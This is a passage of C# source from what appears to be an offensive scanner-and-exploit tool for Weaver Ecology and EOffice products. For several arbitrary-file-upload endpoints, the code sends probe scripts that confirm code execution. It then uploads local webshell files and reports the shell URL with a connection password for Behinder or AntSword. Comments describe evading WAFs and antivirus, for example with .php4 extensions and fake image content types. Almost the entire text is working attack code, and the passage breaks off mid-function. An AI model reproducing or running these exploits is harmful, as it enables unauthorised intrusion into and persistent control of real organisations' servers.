                                richtextBox.AppendText("[+] " + url + " 存在 Ecology ktreeUploadAction 的任意文件上传漏洞" + "\n");
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        private async Task weaver_UploadExp_Ecology_ktreeUploadAction(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image";

            /*
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
            };*/
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                string randBoundry = GenerateRandomFileName(32);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(6);
                string pocjspName = randomFileString + ".jsp";
                string filePath = "api.jsp";
                byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                var fileContent = new ByteArrayContent(fileBytes);


                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"test\"",
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string charset = resp1.Content.Headers.ContentType.CharSet ?? Encoding.UTF8.WebName;
                        string resp1JsonRs = "";
                        // 不管服务器是什么响应都直接设置为 Encoding.UTF8 编码
                        using (var reader = new StreamReader(await resp1.Content.ReadAsStreamAsync(), Encoding.GetEncoding(Encoding.UTF8.WebName)))
                        {
                            resp1JsonRs = reader.ReadToEnd();
                        }

                        JObject resp1Json = JObject.Parse(resp1JsonRs);

                        string pocPath = "";
                        if (resp1Json != null && resp1Json["url"] != null)
                        {
                            pocPath = resp1Json["url"].Value<string>();
                        }
                        else { return; }

                        string poc2Url = baseUrl + pocPath;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        // 这后边应该是 200 或者 500 才能说明所上传的代码文件得到了执行吧
                        if ((resp2.StatusCode == HttpStatusCode.InternalServerError) || (resp2.StatusCode == HttpStatusCode.OK))
                        {
                            richtextBox.AppendText("[+] " + "Ecology ktreeUploadAction 上传成功: " + poc2Url + " 天蝎连接 " + "pass: oldqax" + "\n");
                            return;
                        }
                        else
                        {
                            richtextBox.AppendText("[*] " + "Ecology ktreeUploadAction 上传失败、可能是由于 webshell 被服务器查杀了！！！\n");
                            return;
                        }
                    }
                    else
                    {
                        richtextBox.AppendText("[*] " + "Ecology ktreeUploadAction 上传失败、目标无法访问或漏洞已修补！！！\n");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] Check FileUpload Error!!!\n Ecology_ktreeUploadAction:  " + url + ex.Message + "\n");
                    return;
                }
            }
        }

        private void weaver_CheckUpload_Ecology_pageUploadOperation(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/page/exportImport/uploadOperation.jsp";

            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                string randBoundry = GenerateRandomFileName(32);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(4);
                string pocjspName = randomFileString + ".jsp";
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<%out.print(43311 * 43761);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"file\"",
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string poc2Url = baseUrl + "/page/exportImport/fileTransfer/" + pocjspName;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            if (resp2.Content.ReadAsStringAsync().Result.Contains("1895332671"))
                            {
                                richtextBox.AppendText("[+] " + url + " 存在 Ecology PageExportImport 的任意文件上传漏洞" + "\n");
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        private void weaver_UploadExp_Ecology_pageUploadOperation(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/page/exportImport/uploadOperation.jsp";
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                string randBoundry = GenerateRandomFileName(32);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(4);
                string pocjspName = randomFileString + ".jsp";
                string filePath = "api.jsp";
                byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"file\"",
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string poc2Url = baseUrl + "/page/exportImport/fileTransfer/" + pocjspName;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if ((resp2.StatusCode == HttpStatusCode.OK) || (resp2.StatusCode == HttpStatusCode.InternalServerError))
                        {
                            richtextBox.AppendText("[+] " + "Ecology pageExport 上传成功: " + poc2Url + " 天蝎连接 " + "pass: oldqax" + "\n");
                        }
                        else
                        {
                            richtextBox.AppendText("[-] " + "Ecology pageExport 上传失败、可能 webshell 内容编码存在问题或目标服务器 WAF 拦截！！！\n");
                            return;
                        }
                    }
                    else
                    {
                        richtextBox.AppendText("[-] " + "Ecology pageExport 无法上传、目标服务器漏洞已修复或被 WAF 拦截！！！\n");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] Check FileUpload Error!!!\n Ecology_PageExport:  " + url + ex.Message + "\n");
                    return;
                }
            }
        }

        private void weaver_CheckUpload_Ecology_workrelate(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/workrelate/plan/util/uploaderOperate.jsp";

            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 由于这个漏洞似乎 Boundry 是一样的它的 fileid 就会变成一样的、所以必须要用随机的 Boundry
                string randBoundry = "----WebKitFormBoundary" + GenerateRandomFileName(16);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(16);
                string pocjspName = randomFileString + ".jsp";

                var idContent = new ByteArrayContent(Encoding.UTF8.GetBytes("1"));
                idContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    // 这里必须要带入双引号在包里、不然会由于后端服务器不同版本的解析问题导致上传失败
                    Name = "\"secId\""
                };
                multipartContent.Add(idContent);

                // 添加文件请求数据(随便输出一个数字)
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<% out.println(\"78147002\"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"));
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"Filedata\"",
                    // 设置这里 filename 参数为上边所生成的 16 位的随机文件名
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);

                var plandetailidContent = new ByteArrayContent(Encoding.UTF8.GetBytes("1"));
                plandetailidContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"plandetailid\""
                };
                multipartContent.Add(plandetailidContent);

                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(8);
                // 异步等待发送请求
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string resp1Content = resp1.Content.ReadAsStringAsync().Result;
                        // 从请求 1 所响应的 html 内容之类的里边提取出 fileid 参数的值来
                        // 从上边这个所响应的超链接的内容中提取出第二个 poc 请求中所需的 fileid 参数
                        Regex fileidRegex = new Regex(@"fileid=(\d+)");
                        MatchCollection matches = fileidRegex.Matches(resp1Content);

                        // 这里这个正则式有问题、没匹配到东西
                        string fileid = "";
                        foreach (Match match in matches)
                        {
                            if (match.Success && match.Groups.Count > 1)
                            {
                                fileid = match.Groups[1].Value;
                            }
                        }
                        // 如果 fileid 为空或 -1 则无法进行后续的触发 OfficeServer 解压释放文件的上传流程
                        // 必须要去触发服务器去解压才行、不然后边再上传好像就上传不了。

                        string poc2Url = baseUrl + "/OfficeServer";
                        var req2 = new HttpRequestMessage(HttpMethod.Post, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var multipartContent2 = new MultipartFormDataContent("----WebKitFormBoundaryvxrgchxm");

                        var formContent = new ByteArrayContent(Encoding.UTF8.GetBytes("{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"" + fileid + "\"}"));
                        // 这里formCotent 中的  6148 需要替换成从 fileid 中所获取到的数字

                        formContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                        {
                            Name = "\"xxx\""
                        };
                        // 需要把构造的请求参数加进去
                        multipartContent2.Add(formContent);
                        req2.Content = multipartContent2;

                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果 poc2 执行成功、则我们需要从 poc2 类似如下的响应:
                            // HTTP / 1.1 200 OK
                            // Content-Length: 108
                            // Content-Type: text / html; charset = ISO8859 - 1
                            // Date: Wed, 06 Mar 2024 11:09:24 GMT
                            // Imagetype: d:\WEAVER\ecology\\ebmgigwpuhzcabhchkjf.jsp
                            // Position: null
                            // Server: WVS
                            // Status: 插入图片成功!
                            // <% out.println("12400461"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>



                            // 如果包含则继续判断 Imagetype 响应头中是否包含 jsp 文件名
                            if (resp2.Headers.Contains("Imagetype"))
                            {
                                string imagetype = resp2.Headers.GetValues("Imagetype").First();
                                // 从响应的响应头中提取出 Imagetype 的值、并截取出其最后的 jsp 文件名
                                //string[] imagetypeArray = Regex.Split(imagetype, @"//");
                                Uri uri = new Uri("file://" + imagetype);
                                string jspFileName = uri.Segments[uri.Segments.Length - 1];

                                // 获取到 jsp 文件名后、再次请求这个 jsp 文件看是否能够获取到我们所上传的 jsp 代码执行时会输出的 78147002 这个数字
                                string poc3Url = baseUrl + "/" + jspFileName;
                                var req3 = new HttpRequestMessage(HttpMethod.Get, poc3Url);
                                var resp3 = httpClient.SendAsync(req3).Result;
                                if (resp3.StatusCode == HttpStatusCode.OK)
                                {
                                    string resp3Content = resp3.Content.ReadAsStringAsync().Result;
                                    if (resp3Content.Contains("78147002"))
                                    {
                                        richtextBox.AppendText("[+] " + url + " 存在Ecology workrelate 任意文件上传漏洞" + "\n");
                                        return;
                                    }
                                    else
                                    {
                                        return;
                                    }
                                }
                                else
                                {
                                    return;
                                }
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }

                }
                catch (Exception ex)
                {
                }

            }
        }
        private void weaver_UploadExp_Ecology_workrelate(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/workrelate/plan/util/uploaderOperate.jsp";


            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                string randBoundry = "----WebKitFormBoundary" + GenerateRandomFileName(16);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(16);
                string pocjspName = randomFileString + ".jsp";

                var idContent = new ByteArrayContent(Encoding.UTF8.GetBytes("1"));
                idContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"secId\""
                };
                multipartContent.Add(idContent);
                string filePath = "ant.jsp";
                byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"Filedata\"",
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);

                var plandetailidContent = new ByteArrayContent(Encoding.UTF8.GetBytes("1"));
                plandetailidContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"plandetailid\""
                };
                multipartContent.Add(plandetailidContent);

                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string resp1Content = resp1.Content.ReadAsStringAsync().Result;
                        Regex fileidRegex = new Regex(@"fileid=(\d+)");
                        MatchCollection matches = fileidRegex.Matches(resp1Content);

                        string fileid = "";
                        foreach (Match match in matches)
                        {
                            if (match.Success && match.Groups.Count > 1)
                            {
                                fileid = match.Groups[1].Value;
                            }
                        }

                        string poc2Url = baseUrl + "/OfficeServer";
                        var req2 = new HttpRequestMessage(HttpMethod.Post, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var multipartContent2 = new MultipartFormDataContent("----WebKitFormBoundaryvxrgchxm");

                        var formContent = new ByteArrayContent(Encoding.UTF8.GetBytes("{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"" + fileid + "\"}"));

                        formContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                        {
                            Name = "\"xxx\""
                        };
                        multipartContent2.Add(formContent);
                        req2.Content = multipartContent2;

                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果包含则继续判断 Imagetype 响应头中是否包含 jsp 文件名
                            if (resp2.Headers.Contains("Imagetype"))
                            {
                                string imagetype = resp2.Headers.GetValues("Imagetype").First();
                                // 从响应的响应头中截取出 webshell 地址:
                                Uri uri = new Uri("file://" + imagetype);
                                string jspFileName = uri.Segments[uri.Segments.Length - 1];


                                string poc3Url = baseUrl + "/" + jspFileName;
                                var req3 = new HttpRequestMessage(HttpMethod.Get, poc3Url);
                                var resp3 = httpClient.SendAsync(req3).Result;
                                // 如果 http 响应码为 500 则说明后端是运行了 jsp 脚本的，那说明还是上传成功了但可能有一些杀软之类的
                                if (resp3.StatusCode == HttpStatusCode.InternalServerError)
                                {
                                    richtextBox.AppendText("[+] " + "Ecology workrelate 上传成功但服务器上可能存在杀软: " + poc3Url + " 蚁剑 JspJs连接 " + "pass: oldqax" + "\n");
                                    return;
                                }
                                // 如果 http 响应码为 200 则说明 jsp 脚本正常上传成功
                                if (resp3.StatusCode == HttpStatusCode.OK)
                                {
                                    richtextBox.AppendText("[+] " + "Ecology workrelate 上传成功: " + poc3Url + " 蚁剑 JspJs连接 " + "pass: oldqax" + "\n");
                                    return;
                                }
                                else
                                {
                                    richtextBox.AppendText("[*] " + url + " 由于本漏洞所上传时可能会由于服务器未能及时删除缓存导致误判、所以可以隔几分钟多打几遍再试试！" + "\n");
                                    return;
                                }
                            }
                            else
                            {
                                richtextBox.AppendText("[*] " + url + " 由于本漏洞所上传时可能会由于服务器未能及时删除缓存导致误判、所以可以隔几分钟多打几遍再试试！" + "\n");
                                return;
                            }
                        }
                        else
                        {
                            richtextBox.AppendText("[*] " + url + " 由于本漏洞所上传时可能会由于服务器未能及时删除缓存导致误判、所以可以隔几分钟多打几遍再试试！" + "\n");
                            return;
                        }
                    }

                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] FileUpload Error!!!\n Ecology workrelate Upload Error! :  " + url + ex.Message + "\n");
                    return;
                }

            }
        }

        private void weaver_CheckUpload_Eoffice10_iWebOffice(Uri url, System.Windows.Forms.RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php";
            /*
            // 调试专用:
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
            };
            // 需要调试的时候这里的 HttpClient 中的参数就传入 handler
            */
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 创建 MultipartFormDataContent 对象
                var multipartContent = new MultipartFormDataContent("----WebKitFormBoundaryJjb5ZAJOOXO7fwjs");
                // 添加文件请求数据
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<?php echo 2499368491;unlink(__FILE__);?>"));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "FileData",
                    FileName = "1.jpg"
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);

                // TODO: 这里看需不需所生成的是随机文件名? 还是直接写死一个文件名
                // 随机生成一个类似 yiaihdzdwbnjvpupswwn 这种长度同时只有小写字母的字符串
                //string randomString = Path.GetRandomFileName().Replace(".", "");
                //string pocphpName = randomString + ".php";

                // 添加 poc1 的表单数据
                var form1DataContent = new StringContent("{\"USERNAME\":\"\",\"RECORDID\":\"undefined\",\"OPTION\":\"SAVEFILE\",\"FILENAME\":\"yiaihdzdwbnjvpupswwq.php\"}");
                form1DataContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data") { Name = "FormData" };
                // 将 form1DataContent 添加到 multipartContent 中
                multipartContent.Add(form1DataContent);
                req1.Content = multipartContent;


                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求

                try
                {
                    // 异步等待发送请求
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        // 下一步去请求我们所上传的 yiaihdzdwbnjvpupswwn.php 看响应中是否包含执行结果: 2499368491、 这里也是暂时写死了文件名 TODO: 后续可能还是需要修改成随机文件名
                        string poc2Url = baseUrl + "/eoffice10/server/public/iWebOffice2015/Document/yiaihdzdwbnjvpupswwq.php";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果 poc1 发送成功才进行 poc2 的检测
                            string resp2Content = resp2.Content.ReadAsStringAsync().Result;
                            if (resp2Content.Contains("2499368491"))
                            {

                                // 在这里执行对 richTextBox_weaverAllCheck 的操作
                                richtextBox.AppendText("[+] " + url + " 存在Eoffice10 的 IWebOffice 组件的任意文件上传漏洞" + "\n");
                                return;
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }

            }
        }
        private void weaver_UploadExp_Eoffice10_iWebOffice(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php";

            // 调试专用:
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
            };
            // 需要调试的时候这里的 HttpClient 中的参数就传入 handler

            using (var httpClient = new HttpClient(handler))
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                var multipartContent = new MultipartFormDataContent("----WebKitFormBoundaryJjb5ZAJOOXO7fwje");
                // 这里是通过直接指定字符串的方式来指定上传文件的内容
                //var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<?php echo 111111;?>"));
                // 但是一般可能我们都是需要直接上传天蝎或哥斯拉这些的马
                string filePath = "api.php";
                byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "FileData",
                    FileName = "2.jpg"
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);
                string randomFileName = GenerateRandomFileName(20) + ".php";
                var form1DataContent = new StringContent($"{{\"USERNAME\":\"\",\"RECORDID\":\"undefined\",\"OPTION\":\"SAVEFILE\",\"FILENAME\":\"{randomFileName}\"}}", Encoding.UTF8);
                form1DataContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data") { Name = "FormData" };
                // 将 form1DataContent 添加到 multipartContent 中
                multipartContent.Add(form1DataContent);
                req1.Content = multipartContent;

                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求
                try
                {
                    // 异步等待发送请求
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        // 下一步去请求我们所上传的 yiaihdzdwbnjvpupswwn.php 看响应中是否包含执行结果: 2499368491、 这里也是暂时写死了文件名 TODO: 后续可能还是需要修改成随机文件名
                        string documentPath = "/eoffice10/server/public/iWebOffice2015/Document/";
                        string poc2Url = $"{baseUrl}{documentPath}{randomFileName}";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果我们所上传的一句话再访问时响应码为 200、那么说明我们可以进行后续判断来确认一句话是否真的是上传成功并执行了
                            // string resp2Content = resp2.Content.ReadAsStringAsync().Result;
                            // 这里这个对一句话能否利用的判断也可以根据响应头来?
                            bool hasSetCookieHeader = resp2.Headers.Contains("Set-Cookie");
                            // 因为如果上传的一句话访问这个文件能够连上的话、一般就会有 session 建立了，所以这里直接检测是否有 Set-Cookie 头来稍微精确一点的判断是否上传成功
                            if (hasSetCookieHeader)
                            {
                                // 上边这个 if 判断只能判断别人服务器上是否有这个文件、但是无法精确判断我们的就一定传上去了、同时也无法判断马一定能连
                                richtextBox.AppendText("[+] " + "EOffice10 iWebOffice 上传成功: " + poc2Url + "天蝎 " + "pass: oldqax" + "\n");
                                return;
                            }
                            else
                            {
                                richtextBox.AppendText("[+] " + "EOffice10 iWebOffice 文件传了但未必可执行、自己手动检查吧: " + poc2Url + "天蝎 " + "pass: oldqax" + "\n");
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] Check FileUpload Error!!!\n Eoffice10_iWebOffice:  " + url + ex.Message + "\n");
                    return;
                }
            }
        }

        private void weaver_CheckUpload_Eoffice10_welink(Uri url, System.Windows.Forms.RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/eoffice10/server/public/api/welink/welink-move";
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                httpClient.DefaultRequestHeaders.Add("Accet-Encoding", "gzip, deflate");


                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求

                try
                {
                    // 异步等待发送请求
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        // 下一步去判断 poc 包的 web 响应内容是否响应内容为类似 {"status":0,"errors":[{"code":"0x000013","message":"api\u9519\u8bef"}],"runtime":"0.537"}
                        String resp1_string = resp1.Content.ReadAsStringAsync().Result;
                        if (resp1_string.Contains("api\\u9519\\u8bef") && resp1_string.Contains("0x000013"))
                        {
                            richtextBox.AppendText("[+] " + url + " 存在 Eoffice10 的 Welink 组件的任意文件上传漏洞" + "\n");
                            return;
                        }
                        else { return; }
                    }
                }
                catch (Exception ex)
                {
                    // 由于异常处理是另外一个线程、无法操作 csharp 里的 UI 线程所以这里留空直接不管无法访问的目标
                }

            }
        }

        // TODO: welink exp
        private void weaver_UploadExp_Eoffice10_welink(Uri url, System.Windows.Forms.RichTextBox richtextBox) { }


        private void weaver_CheckUpload_Eoffice8_webservice(Uri url, System.Windows.Forms.RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/webservice/upload/upload.php";
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 创建 MultipartFormDataContent 对象
                var multipartContent = new MultipartFormDataContent("----WebKitFormBoundarykwrnwifs");

                string randomString = GenerateRandomFileName(4);
                string pocphpName = randomString + ".php4";
                // 添加文件请求数据(为一个随机需要计算的 md5)
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<?php echo md5(42380); unlink(__FILE__);?>"));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "file",
                    // 设置这里 filename 参数为上边所生成的四位的随机文件名
                    FileName = $"{pocphpName}"
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);


                req1.Content = multipartContent;

                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    string resp1Content = resp1.Content.ReadAsStringAsync().Result;

                    // 检测 resp1 中的响应内容中是否包含随机所上传的 php 文件名
                    if (resp1Content.Contains($"{pocphpName}"))
                    {
                        // 从 resp1 中按照 * 号分割得到所上传的时间戳路径
                        string[] pocphpPathArray = resp1Content.Split('*');
                        // 得到所上传的 php 文件的完整地址
                        string poc2Url = baseUrl + "/attachment/" + pocphpPathArray[0] + "/" + pocphpName;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        req2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                        var resp2 = httpClient.SendAsync(req2).Result;
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            // 如果 poc1 文件上传成功了则我们检测该脚本中是否成功包含了 md5(42380) 的结果
                            string resp2Content = resp2.Content.ReadAsStringAsync().Result;
                            if (resp2Content.Contains("0db6221b4c53369646ff603fcaa8981d"))
                            {
                                richtextBox.AppendText("[+] " + url + " 泛微 EOffice8 webservice 任意文件上传漏洞" + "\n");
                                return;
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }

            }

        }
        private void weaver_UploadExp_Eoffice8_webservice(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/webservice/upload/upload.php";
            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 设置随机分割线 --> 这里不知为何随机分割线不能用 string 变量来设、只能给它一个固定的字符值
                // string random_boundry = "----WebKitFormBoundary"+GenerateRandomFileName(8);

                var multipartContent = new MultipartFormDataContent("----WebKitFormBoundarytgesubvc");

                string randomString = GenerateRandomFileName(4);
                // 这里后缀默认设置为 php4 要比 php 后缀的上传成功率高一点
                string webshell_Name = randomString + ".php4";
                // 添加文件请求数据(为一个随机需要计算的 md5)
                string localShellPath = "api.php";
                byte[] fileBytes = File.ReadAllBytes(localShellPath);
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "file",
                    // 设置这里 filename 参数为上边所生成的四位的随机文件名
                    FileName = $"{webshell_Name}"
                };
                // 将文件请求数据添加到 multipartContent 中
                multipartContent.Add(fileContent);

                req1.Content = multipartContent;

                // 设置超时时间为 8 秒
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                // 异步等待发送请求
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
